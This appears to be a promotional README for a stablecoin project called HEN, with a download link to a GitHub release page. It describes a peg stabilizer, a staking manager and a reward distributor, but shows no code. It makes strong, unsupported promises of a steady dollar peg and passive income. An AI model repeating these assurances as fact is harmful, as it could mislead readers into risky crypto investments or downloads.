**HEN: The Next-Generation Stablecoin Ecosystem**

[Download here](https://github.com/tractor321y8/Hen/releases)

HEN is an innovative stablecoin designed to maintain a consistent peg to the US Dollar, creating a reliable digital asset for decentralized finance and everyday transactions. Beyond simple price stability, HEN integrates a unique, automated ecosystem that generates passive income for its holders through diversified staking strategies across multiple EVM-compatible blockchains.

**Core Principles**

HEN operates on a dual-purpose model:
1.  **Price Stability:** Rigorously maintaining its 1 USD peg.
2.  **Value Generation:** Generating passive income from decentralized staking.

**The HEN Ecosystem Components**

The HEN ecosystem is comprised of several interconnected smart contracts, each with a specialized role:

**1. HenToken (ERC-20 Standard)**
At its heart, HEN is an ERC-20 compliant token. This ensures broad compatibility with existing wallets, exchanges, and decentralized applications across the Ethereum ecosystem and its various Layer-2 solutions and EVM-compatible networks. HenToken serves as the fundamental unit of value and the medium for all interactions within the HEN ecosystem.

**2. HenStabilizer: Maintaining the Peg**
The HenStabilizer contract is the cornerstone of HEN's price stability. It dynamically monitors HEN's market price against the US Dollar across decentralized exchanges. Should HEN's price deviate from its 1 USD target, the HenStabilizer automatically executes arbitrage-like operations:
* If HEN trades below 1 USD, it buys HEN using a dedicated reserve of stablecoins.
* If HEN trades above 1 USD, it sells HEN for stablecoins.
This continuous, automated intervention ensures that HEN remains steadfastly pegged to the US Dollar, providing a reliable store of value. The HenStabilizer holds 20% of the system's liquidity, readily available to perform these vital price-correcting actions.

**3. StakingManager: Automated Yield Generation**
The StakingManager contract is the engine of passive income for HEN holders. It is designed to maximize returns by strategically deploying assets into various secure staking pools across different EVM-compatible networks (such as Ethereum, Polygon, and Binance Smart Chain).
* **Automated Liquidity Allocation:** 80% of the value from every purchase transaction of HEN (in the underlying non-HEN currency) is automatically channeled to the StakingManager. This mechanism ensures a continuous flow of capital for yield generation.
* **Intelligent Pool Evaluation:** The StakingManager constantly evaluates available staking pools based on comprehensive criteria including security, historical performance, liquidity, and activity. It automatically deposits assets into optimal pools and rebalances positions by withdrawing from underperforming or inactive pools, ensuring efficient and secure yield generation.
* **Diversified Staking:** By interacting with official staking protocols on various EVM chains, the StakingManager diversifies the staking risk and optimizes returns.

**4. HenDistributor: Passive Income for Holders**
The HenDistributor contract is responsible for delivering the fruits of the StakingManager's efforts directly to HEN holders.
* **Automatic Reward Collection:** It periodically collects accumulated staking rewards (which can be in various native blockchain currencies like ETH, MATIC, BNB) from the StakingManager.
* **Proportional Distribution:** These collected rewards are then distributed proportionally to all HenToken holders based on their HEN holdings.
* **Gas-Efficient Payouts:** The distribution mechanism is designed for gas efficiency, ensuring that the process is sustainable and that the maximum amount of rewards reaches the holders. Gas costs for the distribution are automatically deducted from the total rewards, so users receive their net earnings without additional hassle. Users can easily check their wallets to see the different currencies they've received from staking payouts.
